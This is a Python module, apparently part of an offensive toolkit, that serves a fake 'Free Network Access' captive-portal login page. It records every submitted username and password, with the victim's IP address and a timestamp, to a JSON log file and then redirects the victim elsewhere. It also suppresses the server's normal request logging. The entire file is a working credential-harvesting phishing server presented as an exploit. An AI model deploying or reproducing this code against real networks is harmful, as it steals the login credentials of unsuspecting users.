# modules/exploits/captive_portal_injector.py

import http.server
import socketserver
import argparse
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1185"  # Browser Session Hijacking

FAKE_HTML = """
<html>
<head><title>Free Access</title></head>
<body>
<h2>Free Network Access – Login Required</h2>
<form method="POST" action="/capture">
  Username: <input name="user"><br>
  Password: <input name="pass" type="password"><br>
  <input type="submit" value="Login">
</form>
</body>
</html>
"""

def log_creds(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

class CaptiveHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(FAKE_HTML.encode())

    def do_POST(self):
        if self.path == "/capture":
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode()
            log_creds({
                "timestamp": datetime.utcnow().isoformat(),
                "source_ip": self.client_address[0],
                "creds": data,
                "ttp": MITRE_TTP
            })
            self.send_response(302)
            self.send_header("Location", "http://example.com")
            self.end_headers()

    def log_message(self, format, *args):
        return  # suppress noisy logging

def start_server(port):
    with socketserver.TCPServer(("", port), CaptiveHandler) as httpd:
        print(f"[✓] Captive portal running on port {port}")
        httpd.serve_forever()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Captive Portal Injector")
    parser.add_argument("--port", type=int, default=8080, help="HTTP port to listen on")
    args = parser.parse_args()
    start_server(args.port)
